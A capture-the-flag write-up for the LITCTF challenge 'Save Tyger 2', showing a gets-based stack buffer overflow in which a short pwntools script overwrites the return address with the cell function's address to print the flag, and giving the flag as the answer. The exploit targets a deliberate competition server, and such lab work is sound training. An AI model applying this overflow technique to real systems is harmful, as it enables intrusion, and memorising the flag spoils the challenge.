# Save Tyger 2

## Problem Statement
Tyger needs your help again.
Connect with nc litctf.live 31788

https://drive.google.com/uc?export=download&id=1qCSTo01YjzrncT0SZGOTouC4egY_q-PX

## Solution
We used `webshell.picoctf.org` for most of the debugging, and then switched to a local terminal for the final result.

First, we downloaded the zip file in the drive link, and opened it. Viewing the `save_tyger2.c` file, we see a couple of important details:

The `cell` function opens the flag and prints it out; we clearly want to call it. 
Moreover, in `main` we see a `gets`, which tells us that we want to invoke a buffer overflow.

Specifically, we want to overflow the `buf` array, and inject the address of `cell` after that. To get the location of `cell`, we chose to decompile the 
executable in assembly, using `objdump -M intel -d save_tyger2 > dis.asm`. Scrolling to `cell`, we see that the address is `0x0000000000401162`.

All that's left to do is inject this address in a buffer overflow:

```py
from pwn import *
r = remote("litctf.live", 31788)
s = 'a'*32 + 'b'*8 + '\x62\x11\x40\x00\x00\x00\x00\x00'  # Backwards since stack is read in reverse
r.sendline(s)
r.recvline()
r.recvline()
r.recvline()
print(r.recvline())
# >>> LITCTF{w3_w0nt_l3t_th3m_t4k3_tyg3r_3v3r_4gain}
```

## Answer
`LITCTF{w3_w0nt_l3t_th3m_t4k3_tyg3r_3v3r_4gain}`
